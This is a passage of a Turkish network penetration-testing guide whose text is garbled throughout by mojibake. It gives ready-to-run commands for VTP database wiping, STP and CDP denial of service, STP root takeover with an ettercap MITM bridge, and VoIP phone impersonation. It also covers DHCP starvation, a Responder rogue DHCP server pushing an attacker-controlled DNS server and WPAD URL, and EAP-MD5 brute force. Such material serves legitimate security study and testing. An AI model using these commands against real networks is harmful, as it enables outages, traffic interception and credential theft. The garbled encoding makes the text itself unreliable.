EÄŸer **doÄŸrudan baÄŸlÄ± olduÄŸunuz bir anahtara eriÅŸiminiz varsa**, aÄŸ iÃ§indeki VLAN segmentasyonunu **atlama yeteneÄŸine sahipsiniz**. BasitÃ§e, portu trunk moduna (diÄŸer adÄ±yla trunk) geÃ§irin, hedef VLAN'larÄ±n kimlikleriyle sanal arayÃ¼zler oluÅŸturun ve bir IP adresi yapÄ±landÄ±rÄ±n. Adresi dinamik olarak (DHCP) talep edebilir veya statik olarak yapÄ±landÄ±rabilirsiniz. Duruma baÄŸlÄ±dÄ±r.

{% content-ref url="lateral-vlan-segmentation-bypass.md" %}
[lateral-vlan-segmentation-bypass.md](lateral-vlan-segmentation-bypass.md)
{% endcontent-ref %}

#### Katman 3 Ã–zel VLAN Atlama

Misafir kablosuz aÄŸlarÄ± gibi belirli ortamlarda, istemci cihazlarÄ±n doÄŸrudan birbirleriyle iletiÅŸim kurmasÄ±nÄ± engellemek iÃ§in **port izolasyonu (ayrÄ±ca Ã¶zel VLAN olarak da bilinir)** ayarlarÄ± uygulanÄ±r. Ancak, bu izolasyon Ã¶nlemlerini atlatabilen bir teknik tespit edilmiÅŸtir. Bu teknik, aÄŸ ACL'lerinin eksikliÄŸini veya yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmasÄ±nÄ± sÃ¶mÃ¼rerek, IP paketlerinin bir yÃ¶nlendirici Ã¼zerinden baÅŸka bir istemciye ulaÅŸmasÄ±nÄ± saÄŸlar.

SaldÄ±rÄ±, hedef istemcinin IP adresini taÅŸÄ±yan ancak yÃ¶nlendiricinin MAC adresini iÃ§eren bir **paketin oluÅŸturulmasÄ±yla** gerÃ§ekleÅŸtirilir. Bu, yÃ¶nlendiricinin paketi yanlÄ±ÅŸlÄ±kla hedef istemciye iletmelerine neden olur. Bu yaklaÅŸÄ±m, KurbanÄ±n eriÅŸilebilir olduÄŸu bir ana bilgisayarÄ± kontrol etme yeteneÄŸinin kullanÄ±ldÄ±ÄŸÄ± Ã‡ift Etiketleme SaldÄ±rÄ±larÄ±nda kullanÄ±lan yaklaÅŸÄ±ma benzer ÅŸekilde gÃ¼venlik aÃ§Ä±ÄŸÄ±nÄ± sÃ¶mÃ¼rmek iÃ§in kullanÄ±lÄ±r.

**SaldÄ±rÄ±nÄ±n Temel AdÄ±mlarÄ±:**
1. **Paket OluÅŸturma:** Hedef istemcinin IP adresini, ancak yÃ¶nlendiricinin MAC adresini iÃ§eren bir paket Ã¶zel olarak oluÅŸturulur.
2. **YÃ¶nlendirici DavranÄ±ÅŸÄ±nÄ±n SÃ¶mÃ¼rÃ¼lmesi:** OluÅŸturulan paket, Ã¶zel VLAN ayarlarÄ± tarafÄ±ndan saÄŸlanan izolasyonu atlayarak hedef istemciye yÃ¶nlendiriciye gÃ¶nderilir.

### VTP SaldÄ±rÄ±larÄ±

VTP (VLAN Trunking Protocol), VLAN yÃ¶netimini merkezileÅŸtirir. VLAN veritabanÄ± bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ korumak iÃ§in revizyon numaralarÄ±nÄ± kullanÄ±r; herhangi bir deÄŸiÅŸiklik bu numarayÄ± artÄ±rÄ±r. Anahtarlar, kendi VLAN veritabanlarÄ±nÄ± gÃ¼ncelleyen daha yÃ¼ksek revizyon numaralarÄ±na sahip yapÄ±landÄ±rmalarÄ± benimserler.

#### VTP Etki AlanÄ± Rolleri

- **VTP Sunucusu:** VLAN'larÄ± yÃ¶netir - oluÅŸturur, siler, deÄŸiÅŸtirir. VTP duyurularÄ±nÄ± etki alanÄ± Ã¼yelerine yayÄ±nlar.
- **VTP Ä°stemcisi:** VTP duyurularÄ±nÄ± alarak VLAN veritabanÄ±nÄ± senkronize eder. Bu rol, yerel VLAN yapÄ±landÄ±rma deÄŸiÅŸikliklerinden etkilenmez.
- **VTP Åeffaf:** VTP gÃ¼ncellemelerine katÄ±lmaz, ancak VTP duyurularÄ±nÄ± ileterek ileri yÃ¶nlendirir. VTP saldÄ±rÄ±larÄ±ndan etkilenmez, sÃ¼rekli bir sÄ±fÄ±r revizyon numarasÄ± korur.

#### VTP Duyuru TÃ¼rleri

- **Ã–zet Duyurusu:** VTP sunucusu tarafÄ±ndan her 300 saniyede bir yayÄ±nlanÄ±r, temel etki alanÄ± bilgilerini taÅŸÄ±r.
- **Alt KÃ¼me Duyurusu:** VLAN yapÄ±landÄ±rma deÄŸiÅŸikliklerini takiben gÃ¶nderilir.
- **Duyuru Ä°steÄŸi:** VTP istemcisi tarafÄ±ndan bir Ã–zet Duyurusu istemek iÃ§in yayÄ±nlanÄ±r, genellikle daha yÃ¼ksek bir yapÄ±landÄ±rma revizyon numarasÄ± tespit edildiÄŸinde yanÄ±t olarak.

VTP zafiyetleri yalnÄ±zca trunk portlarÄ± aracÄ±lÄ±ÄŸÄ±yla sÃ¶mÃ¼rÃ¼lebilir, Ã§Ã¼nkÃ¼ VTP duyurularÄ± yalnÄ±zca bunlar arasÄ±nda dolaÅŸÄ±r. DTP sonrasÄ± saldÄ±rÄ± senaryolarÄ± VTP'ye yÃ¶nelebilir. Yersinia gibi araÃ§lar, VLAN veritabanÄ±nÄ± silmeyi hedefleyen VTP saldÄ±rÄ±larÄ±nÄ± kolaylaÅŸtÄ±rabilir ve aÄŸÄ± etkisiz hale getirebilir.

Not: Bu tartÄ±ÅŸma VTP sÃ¼rÃ¼m 1 (VTPv1) ile ilgilidir.
```bash
%% yersinia -G # Launch Yersinia in graphical mode ```
```
Yersinia'nÄ±n grafiksel modunda, VLAN veritabanÄ±nÄ± temizlemek iÃ§in tÃ¼m VTP VLAN'larÄ±nÄ± silme seÃ§eneÄŸini seÃ§in.


### STP SaldÄ±rÄ±larÄ±

**ArayÃ¼zlerinizde BPDU Ã§erÃ§evelerini yakalayamazsanÄ±z, STP saldÄ±rÄ±sÄ±nda baÅŸarÄ±lÄ± olmanÄ±z olasÄ± deÄŸildir.**

#### **STP BPDU DoS**

Ã‡ok sayÄ±da BPDUs TCP (Topology Change Notification) veya Conf (topoloji oluÅŸturulduÄŸunda gÃ¶nderilen BPDUs) gÃ¶ndererek, anahtarlar aÅŸÄ±rÄ± yÃ¼klenir ve doÄŸru ÅŸekilde Ã§alÄ±ÅŸmayÄ± durdurur.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP SaldÄ±rÄ±sÄ±**

Bir TCP gÃ¶nderildiÄŸinde, anahtarlarÄ±n CAM tablosu 15 saniye iÃ§inde silinir. ArdÄ±ndan, sÃ¼rekli olarak bu tÃ¼r paketler gÃ¶nderiyorsanÄ±z, CAM tablosu sÃ¼rekli olarak yeniden baÅŸlatÄ±lÄ±r (veya her 15 saniyede bir) ve yeniden baÅŸlatÄ±ldÄ±ÄŸÄ±nda anahtar hub gibi davranÄ±r.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP KÃ¶k SaldÄ±rÄ±sÄ±**

SaldÄ±rgan, aÄŸÄ±n STP kÃ¶kÃ¼ olmak iÃ§in bir anahtarÄ±n davranÄ±ÅŸÄ±nÄ± taklit eder. ArdÄ±ndan, daha fazla veri onun Ã¼zerinden geÃ§er. Bu, farklÄ± iki anahtara baÄŸlÄ± olduÄŸunuzda ilginÃ§ olabilir.\
Bu, BPDUs CONF paketleri gÃ¶ndererek yapÄ±lÄ±r ve bu paketlerdeki **Ã¶ncelik** deÄŸeri, gerÃ§ek kÃ¶k anahtarÄ±n gerÃ§ek Ã¶nceliÄŸinden daha dÃ¼ÅŸÃ¼k olduÄŸu belirtilir.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**EÄŸer saldÄ±rgan 2 anahtara baÄŸlÄ±ysa, yeni aÄŸacÄ±n kÃ¶kÃ¼ olabilir ve bu anahtarlar arasÄ±ndaki tÃ¼m trafiÄŸi Ã¼zerinden geÃ§irebilir** (bir MITM saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirilecektir).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP SaldÄ±rÄ±larÄ±

CISCO Discovery Protocol (CDP), CISCO cihazlarÄ± arasÄ±ndaki iletiÅŸim iÃ§in Ã¶nemlidir ve cihazlarÄ±n birbirlerini tanÄ±masÄ±nÄ± ve yapÄ±landÄ±rma ayrÄ±ntÄ±larÄ±nÄ± paylaÅŸmasÄ±nÄ± saÄŸlar.

#### Pasif Veri Toplama <a href="#0e0f" id="0e0f"></a>

CDP, tÃ¼m portlardan bilgi yayÄ±nlamak Ã¼zere yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r, bu da bir gÃ¼venlik riskine yol aÃ§abilir. Bir saldÄ±rgan, bir anahtara baÄŸlandÄ±ÄŸÄ±nda **Wireshark**, **tcpdump** veya **Yersinia** gibi aÄŸ dinleyicilerini kullanabilir. Bu eylem, aÄŸ cihazÄ± hakkÄ±nda hassas verileri ortaya Ã§Ä±karabilir, bunlar arasÄ±nda cihazÄ±n modeli ve Ã§alÄ±ÅŸtÄ±ÄŸÄ± Cisco IOS sÃ¼rÃ¼mÃ¼ bulunur. SaldÄ±rgan daha sonra belirlenen Cisco IOS sÃ¼rÃ¼mÃ¼ndeki belirli gÃ¼venlik aÃ§Ä±klarÄ±na odaklanabilir.

#### CDP Tablosu Sel SaldÄ±rÄ±sÄ± Yaratma <a href="#0d6a" id="0d6a"></a>

Daha saldÄ±rgan bir yaklaÅŸÄ±m, meÅŸru CISCO cihazlarÄ± gibi davranarak anahtarÄ±n belleÄŸini aÅŸÄ±rÄ± yÃ¼kleyerek Bir Hizmet Reddi (DoS) saldÄ±rÄ±sÄ± baÅŸlatmaktÄ±r. AÅŸaÄŸÄ±da, test iÃ§in tasarlanmÄ±ÅŸ bir aÄŸ aracÄ± olan Yersinia'yÄ± kullanarak bÃ¶yle bir saldÄ±rÄ±yÄ± baÅŸlatmak iÃ§in komut dizisi bulunmaktadÄ±r:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
Bu saldÄ±rÄ± sÄ±rasÄ±nda, anahtarÄ±n CPU'su ve CDP komÅŸu tablosu aÅŸÄ±rÄ± kaynak tÃ¼ketimi nedeniyle sÄ±k sÄ±k **"aÄŸ felci"** olarak adlandÄ±rÄ±lan duruma yol aÃ§ar.

#### CDP Kimlik Taklit SaldÄ±rÄ±sÄ±
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
[**scapy**](https://github.com/secdev/scapy/) kullanabilirsiniz. `scapy/contrib` paketini kurduÄŸunuzdan emin olun.

### VoIP SaldÄ±rÄ±larÄ± ve VoIP Hopper AracÄ±

IoT cihazlarla giderek daha fazla entegre olan VoIP telefonlar, Ã¶zel telefon numaralarÄ± aracÄ±lÄ±ÄŸÄ±yla kapÄ±larÄ± aÃ§ma veya termostatlarÄ± kontrol etme gibi iÅŸlevler sunar. Ancak, bu entegrasyon gÃ¼venlik riskleri oluÅŸturabilir.

[**voiphopper**](http://voiphopper.sourceforge.net) aracÄ±, Ã§eÅŸitli ortamlarda (Cisco, Avaya, Nortel, Alcatel-Lucent) bir VoIP telefonunu taklit etmek iÃ§in tasarlanmÄ±ÅŸtÄ±r. CDP, DHCP, LLDP-MED ve 802.1Q ARP gibi protokoller kullanarak ses aÄŸÄ±ndaki VLAN ID'sini keÅŸfeder.

**VoIP Hopper**, Cisco Discovery Protocol (CDP) iÃ§in Ã¼Ã§ mod sunar:

1. **Sniff Modu** (`-c 0`): AÄŸ paketlerini analiz ederek VLAN ID'sini belirler.
2. **Spoof Modu** (`-c 1`): GerÃ§ek bir VoIP cihazÄ±nÄ±n paketlerini taklit eden Ã¶zel paketler oluÅŸturur.
3. **Ã–nceden OluÅŸturulmuÅŸ Paket ile Spoof Modu** (`-c 2`): Belirli bir Cisco IP telefon modelinin paketlerini gÃ¶nderir.

HÄ±z iÃ§in tercih edilen mod Ã¼Ã§Ã¼ncÃ¼ moddur. Belirtmeniz gerekenler:

- SaldÄ±rganÄ±n aÄŸ arayÃ¼zÃ¼ (`-i` parametresi).
- Taklit edilen VoIP cihazÄ±nÄ±n adÄ± (`-E` parametresi), Cisco adlandÄ±rma formatÄ±na uygun olmalÄ±dÄ±r (Ã¶rneÄŸin, MAC adresini takiben SEP).

Kurumsal ortamlarda, mevcut bir VoIP cihazÄ±nÄ± taklit etmek iÃ§in ÅŸunlarÄ± yapabilirsiniz:

- Telefonun Ã¼zerindeki MAC etiketini inceleyin.
- Model bilgisini gÃ¶rÃ¼ntÃ¼lemek iÃ§in telefonun ekran ayarlarÄ±na gidin.
- VoIP cihazÄ±nÄ± bir dizÃ¼stÃ¼ bilgisayara baÄŸlayÄ±n ve Wireshark kullanarak CDP isteklerini gÃ¶zlemleyin.

ÃœÃ§Ã¼ncÃ¼ modda aracÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in Ã¶rnek bir komut:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
DHCP SaldÄ±rÄ±larÄ±

#### Tespit

DHCP saldÄ±rÄ±larÄ±, aÄŸdaki DHCP (Dynamic Host Configuration Protocol) sunucusunu hedef alÄ±r. Bu saldÄ±rÄ±lar, aÄŸdaki IP adreslerini, aÄŸ geÃ§itlerini ve diÄŸer aÄŸ yapÄ±landÄ±rmalarÄ±nÄ± ele geÃ§irmeyi amaÃ§lar. Bu bÃ¶lÃ¼mde, DHCP saldÄ±rÄ±larÄ± iÃ§in kullanÄ±lan bazÄ± yaygÄ±n teknikler aÃ§Ä±klanmaktadÄ±r.

##### DHCP Starvation

Bu saldÄ±rÄ±da, saldÄ±rgan aÄŸdaki tÃ¼m IP adreslerini tÃ¼keterek DHCP sunucusunun IP adresleri atamasÄ±nÄ± engeller. Bu, aÄŸdaki diÄŸer cihazlarÄ±n IP adresi almasÄ±nÄ± engeller ve aÄŸa eriÅŸimi sÄ±nÄ±rlar.

##### DHCP Spoofing

Bu saldÄ±rÄ±da, saldÄ±rgan, aÄŸdaki DHCP sunucusuna benzer bir DHCP sunucusu oluÅŸturur ve aÄŸdaki cihazlarÄ± yanlÄ±ÅŸ IP adresleriyle yanÄ±ltÄ±r. Bu saldÄ±rÄ±, saldÄ±rganÄ±n aÄŸ trafiÄŸini izlemesine ve hatta deÄŸiÅŸtirmesine olanak tanÄ±r.

##### DHCP Rogue Server

Bu saldÄ±rÄ±da, saldÄ±rgan aÄŸdaki mevcut DHCP sunucusunu taklit eden bir DHCP sunucusu oluÅŸturur. Bu saldÄ±rÄ±, aÄŸdaki cihazlarÄ±n yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ IP adresleri almasÄ±na neden olabilir ve aÄŸa eriÅŸimi sÄ±nÄ±rlayabilir.

##### DHCP Denial of Service (DoS)

Bu saldÄ±rÄ±da, saldÄ±rgan aÄŸdaki DHCP sunucusunu hedef alarak hizmet kesintisine neden olur. Bu, aÄŸdaki cihazlarÄ±n IP adresi almasÄ±nÄ± engeller ve aÄŸa eriÅŸimi sÄ±nÄ±rlar.

#### SaldÄ±rÄ± Tespit YÃ¶ntemleri

DHCP saldÄ±rÄ±larÄ±nÄ± tespit etmek iÃ§in aÅŸaÄŸÄ±daki yÃ¶ntemler kullanÄ±labilir:

##### DHCP LoglarÄ± Ä°zleme

DHCP sunucusunun loglarÄ±nÄ± izlemek, DHCP saldÄ±rÄ±larÄ±nÄ± tespit etmek iÃ§in etkili bir yÃ¶ntem olabilir. DHCP sunucusunun loglarÄ±nda anormal aktiviteler veya IP adresi Ã§akÄ±ÅŸmalarÄ± gibi belirtiler bulunabilir.

##### ARP Ä°zleme

DHCP saldÄ±rÄ±larÄ± genellikle ARP (Address Resolution Protocol) zehirleme saldÄ±rÄ±larÄ±yla birlikte gerÃ§ekleÅŸtirilir. ARP izleme araÃ§larÄ± kullanarak aÄŸdaki ARP trafiÄŸini izlemek, DHCP saldÄ±rÄ±larÄ±nÄ± tespit etmek iÃ§in faydalÄ± olabilir.

##### AÄŸ TrafiÄŸi Ä°zleme

AÄŸ trafiÄŸini izlemek, DHCP saldÄ±rÄ±larÄ±nÄ± tespit etmek iÃ§in etkili bir yÃ¶ntem olabilir. DHCP sunucusuna giden ve gelen trafiÄŸi izlemek, anormal aktiviteleri tespit etmek iÃ§in faydalÄ± olabilir.

##### DHCP GÃ¼venlik DuvarÄ±

DHCP sunucusunu korumak iÃ§in bir DHCP gÃ¼venlik duvarÄ± kullanmak, DHCP saldÄ±rÄ±larÄ±nÄ± Ã¶nlemek iÃ§in etkili bir yÃ¶ntem olabilir. DHCP gÃ¼venlik duvarÄ±, DHCP trafiÄŸini izler ve anormal aktiviteleri engeller.

##### DHCP Ä°zleme AraÃ§larÄ±

DHCP saldÄ±rÄ±larÄ±nÄ± tespit etmek iÃ§in Ã§eÅŸitli DHCP izleme araÃ§larÄ± mevcuttur. Bu araÃ§lar, DHCP trafiÄŸini izler ve anormal aktiviteleri tespit etmek iÃ§in kullanÄ±labilir.
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

DHCP sunucularÄ±na karÅŸÄ± iki tÃ¼r DoS saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirilebilir. Ä°lk saldÄ±rÄ± tÃ¼rÃ¼, tÃ¼m mÃ¼mkÃ¼n IP adreslerini kullanmak iÃ§in yeterli sayÄ±da sahte ana bilgisayarÄ±n simÃ¼le edilmesine dayanÄ±r.\
Bu saldÄ±rÄ±, DHCP sunucusunun yanÄ±tlarÄ±nÄ± gÃ¶rebiliyor ve protokolÃ¼ tamamlayabiliyorsanÄ±z (**KeÅŸfet** (Bilg.) --> **Teklif** (sunucu) --> **Ä°stek** (Bilg.) --> **Onay** (sunucu)). Ã–rneÄŸin, bu, **Wifi aÄŸlarÄ±nda mÃ¼mkÃ¼n deÄŸildir**.

DHCP DoS saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmenin baÅŸka bir yolu, her biri mÃ¼mkÃ¼n olan her IP adresini kaynak kodu olarak kullanarak bir **DHCP-RELEASE paketi gÃ¶ndermektir**. ArdÄ±ndan, sunucu herkesin IP'yi kullanmayÄ± bitirdiÄŸini dÃ¼ÅŸÃ¼necektir.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Bunu yapmanÄ±n daha otomatik bir yolu, [DHCPing](https://github.com/kamorin/DHCPig) adlÄ± aracÄ± kullanmaktÄ±r.

Bahsedilen DoS saldÄ±rÄ±larÄ±nÄ± kullanarak, istemcilerin ortam iÃ§inde yeni kiralama almasÄ±nÄ± ve meÅŸru sunucularÄ±n yanÄ±t veremez hale gelmesini saÄŸlayabilirsiniz. Bu nedenle, meÅŸru sunucu yeniden baÄŸlandÄ±ÄŸÄ±nda, **aÅŸaÄŸÄ±daki saldÄ±rÄ±da belirtilen kÃ¶tÃ¼ amaÃ§lÄ± deÄŸerleri sunabilirsiniz**.

#### KÃ¶tÃ¼ amaÃ§lÄ± deÄŸerlerin ayarlanmasÄ±

DHCP script'i `/usr/share/responder/DHCP.py` konumunda bulunan sahte bir DHCP sunucusu kurulabilir. Bu, HTTP trafiÄŸini ve kimlik bilgilerini yakalayarak trafiÄŸi kÃ¶tÃ¼ amaÃ§lÄ± bir sunucuya yÃ¶nlendirerek aÄŸ saldÄ±rÄ±larÄ± gibi durumlarda kullanÄ±ÅŸlÄ±dÄ±r. Bununla birlikte, sahte bir aÄŸ geÃ§idi kurmak, yalnÄ±zca istemcinin dÄ±ÅŸa yÃ¶nelik trafiÄŸini yakalamasÄ±na izin verdiÄŸi iÃ§in daha az etkilidir ve gerÃ§ek aÄŸ geÃ§idinden gelen yanÄ±tlarÄ± kaÃ§Ä±rÄ±r. Bunun yerine, daha etkili bir saldÄ±rÄ± iÃ§in sahte bir DNS veya WPAD sunucusu kurmanÄ±z Ã¶nerilir.

Sahte DHCP sunucusunu yapÄ±landÄ±rmak iÃ§in aÅŸaÄŸÄ±daki komut seÃ§enekleri bulunmaktadÄ±r:

- **IP Adresimiz (Gateway Advertisement)**: Makinenizin IP adresini aÄŸ geÃ§idi olarak tanÄ±tmak iÃ§in `-i 10.0.0.100` kullanÄ±n.
- **Yerel DNS Alan AdÄ±**: Ä°steÄŸe baÄŸlÄ± olarak, yerel bir DNS alan adÄ± belirlemek iÃ§in `-d example.org` kullanÄ±n.
- **Orijinal YÃ¶nlendirici/AÄŸ GeÃ§idi IP'si**: MeÅŸru yÃ¶nlendirici veya aÄŸ geÃ§idinin IP adresini belirtmek iÃ§in `-r 10.0.0.1` kullanÄ±n.
- **Birincil DNS Sunucusu IP'si**: Kontrol ettiÄŸiniz sahte DNS sunucusunun IP adresini belirlemek iÃ§in `-p 10.0.0.100` kullanÄ±n.
- **Ä°kincil DNS Sunucusu IP'si**: Ä°steÄŸe baÄŸlÄ± olarak, ikincil bir DNS sunucusu IP'si belirlemek iÃ§in `-s 10.0.0.1` kullanÄ±n.
- **Yerel AÄŸÄ±n AÄŸ Maskesi**: Yerel aÄŸ iÃ§in aÄŸ maskesini tanÄ±mlamak iÃ§in `-n 255.255.255.0` kullanÄ±n.
- **DHCP Trafik Ä°Ã§in ArayÃ¼z**: DHCP trafiÄŸini belirli bir aÄŸ arayÃ¼zÃ¼nde dinlemek iÃ§in `-I eth1` kullanÄ±n.
- **WPAD YapÄ±landÄ±rma Adresi**: Web trafiÄŸini yakalamaya yardÄ±mcÄ± olan WPAD yapÄ±landÄ±rma adresini belirlemek iÃ§in `-w â€œhttp://10.0.0.100/wpad.datâ€` kullanÄ±n.
- **Sahte VarsayÄ±lan AÄŸ GeÃ§idi IP'si**: Sahte varsayÄ±lan aÄŸ geÃ§idi IP adresini taklit etmek iÃ§in `-S` ekleyin.
- **TÃ¼m DHCP Ä°steklerine YanÄ±t Verme**: Sunucunun tÃ¼m DHCP isteklerine yanÄ±t vermesi iÃ§in `-R` ekleyin, ancak bu gÃ¼rÃ¼ltÃ¼lÃ¼ olabilir ve tespit edilebilir.

Bu seÃ§enekleri doÄŸru bir ÅŸekilde kullanarak, sahte bir DHCP sunucusu etkili bir ÅŸekilde kurulabilir ve aÄŸ trafiÄŸi yakalanabilir.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP SaldÄ±rÄ±larÄ±**

802.1X uygulamalarÄ±na karÅŸÄ± kullanÄ±labilecek bazÄ± saldÄ±rÄ± taktikleri aÅŸaÄŸÄ±da listelenmiÅŸtir:

* EAP aracÄ±lÄ±ÄŸÄ±yla aktif brute-force parola deneme
* HatalÄ± EAP iÃ§eriÄŸi ile RADIUS sunucusuna saldÄ±rÄ± _\*\*_(exploitler)
* EAP mesajlarÄ±nÄ±n yakalanmasÄ± ve Ã§evrimdÄ±ÅŸÄ± parola kÄ±rma (EAP-MD5 ve PEAP)
* TLS sertifikasÄ± doÄŸrulamasÄ±nÄ± atlamak iÃ§in EAP-MD5 kimlik doÄŸrulamasÄ±nÄ±n zorlanmasÄ±
* Bir hub veya benzeri bir cihaz kullanarak kimlik doÄŸrulama yapÄ±ldÄ±ÄŸÄ±nda kÃ¶tÃ¼ niyetli aÄŸ trafiÄŸi enjekte etme

EÄŸer saldÄ±rgan, kurban ile kimlik doÄŸrulama sunucusu arasÄ±nda ise, kimlik doÄŸrulama protokolÃ¼nÃ¼ gerektiÄŸinde EAP-MD5'e dÃ¼ÅŸÃ¼rmeye Ã§alÄ±ÅŸabilir ve kimlik doÄŸrulama giriÅŸimini yakalayabilir. ArdÄ±ndan, aÅŸaÄŸÄ±daki yÃ¶ntemleri kullanarak brute-force saldÄ±rÄ±sÄ± yapabilir:
```
eapmd5pass â€“r pcap.dump â€“w /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) SaldÄ±rÄ±larÄ± <a href="#6196" id="6196"></a>

**FHRP** (First Hop Redundancy Protocol), **sÄ±cak yedekli bir yÃ¶nlendirme sistemi oluÅŸturmak** iÃ§in tasarlanmÄ±ÅŸ bir aÄŸ protokolÃ¼ sÄ±nÄ±fÄ±dÄ±r. FHRP ile fiziksel yÃ¶nlendiriciler tek bir mantÄ±ksal cihaza birleÅŸtirilebilir, bu da hata toleransÄ±nÄ± artÄ±rÄ±r ve yÃ¼kÃ¼ daÄŸÄ±tmaya yardÄ±mcÄ± olur.

**Cisco Systems mÃ¼hendisleri, GLBP ve HSRP olmak Ã¼zere iki FHRP protokolÃ¼ geliÅŸtirmiÅŸtir.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Routing Information Protocol'Ã¼n (RIP) Ã¼Ã§ versiyonu olduÄŸu bilinmektedir: RIP, RIPv2 ve RIPng. RIP ve RIPv2, datagramlarÄ± UDP kullanarak 520 numaralÄ± porta gÃ¶nderirken, RIPng, datagramlarÄ± IPv6 Ã§oklu yayÄ±nÄ± kullanarak UDP portu 521'e yayÄ±nlar. RIPv2, MD5 kimlik doÄŸrulamasÄ±nÄ± desteklerken, RIPng, yerleÅŸik kimlik doÄŸrulamasÄ±nÄ± iÃ§ermez; bunun yerine IPv6 iÃ§indeki IPsec AH ve ESP baÅŸlÄ±klarÄ±na gÃ¼venilir.

- **RIP ve RIPv2:** Ä°letiÅŸim UDP datagramlarÄ±yla 520 numaralÄ± port Ã¼zerinden gerÃ§ekleÅŸtirilir.
- **RIPng:** IPv6 Ã§oklu yayÄ±nÄ± Ã¼zerinden datagramlarÄ± yayÄ±nlamak iÃ§in UDP portu 521'i kullanÄ±r.

RIPv2, MD5 kimlik doÄŸrulamasÄ±nÄ± desteklerken, RIPng, yerleÅŸik kimlik doÄŸrulamasÄ±nÄ± iÃ§ermez; IPv6 iÃ§indeki IPsec AH ve ESP baÅŸlÄ±klarÄ±na gÃ¼venir.

### EIGRP SaldÄ±rÄ±larÄ±

**EIGRP (Enhanced Interior Gateway Routing Protocol)**, bir dinamik yÃ¶nlendirme protokolÃ¼dÃ¼r. **Bu, bir mesafe-vektÃ¶r protokolÃ¼dÃ¼r.** EÄŸer **kimlik doÄŸrulama yoksa** ve pasif arayÃ¼zlerin yapÄ±landÄ±rmasÄ± yoksa, bir **saldÄ±rgan** EIGRP yÃ¶nlendirmesine mÃ¼dahale edebilir ve **yÃ¶nlendirme tablolarÄ±nÄ±n zehirlenmesine** neden olabilir. AyrÄ±ca, EIGRP aÄŸÄ± (diÄŸer bir deyiÅŸle, Ã¶zerk sistem) **dÃ¼z ve herhangi bir bÃ¶lgeye bÃ¶lÃ¼nmemiÅŸtir**. Bir **saldÄ±rgan bir rota enjekte ederse**, bu rota bÃ¼yÃ¼k olasÄ±lÄ±kla Ã¶zerk EIGRP sistemi boyunca **yayÄ±lacaktÄ±r**.

Bir EIGRP sistemine saldÄ±rmak iÃ§in, bir meÅŸru EIGRP yÃ¶nlendiriciyle **bir komÅŸuluk kurmak** gerekmektedir, bu da temel keÅŸiften Ã§eÅŸitli enjeksiyonlara kadar birÃ§ok olasÄ±lÄ±k sunar.

[**FRRouting**](https://frrouting.org/), BGP, OSPF, EIGRP, RIP ve diÄŸer protokolleri destekleyen **bir sanal yÃ¶nlendiriciyi uygulamanÄ±za olanak tanÄ±r**. Tek yapmanÄ±z gereken, saldÄ±rganÄ±n sisteminize daÄŸÄ±tmasÄ± ve gerÃ§ekten yÃ¶nlendirme alanÄ±nda meÅŸru bir yÃ¶nlendirici gibi davranabilmenizdir.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/), EIGRP (Enhanced Interior Gateway Routing Protocol) yayÄ±nlarÄ±nÄ± engelleme yeteneklerine sahiptir. AyrÄ±ca, yÃ¶nlendirme yapÄ±landÄ±rmalarÄ±nÄ± deÄŸiÅŸtirmek iÃ§in kullanÄ±labilecek paket enjeksiyonuna izin verir.

### OSPF

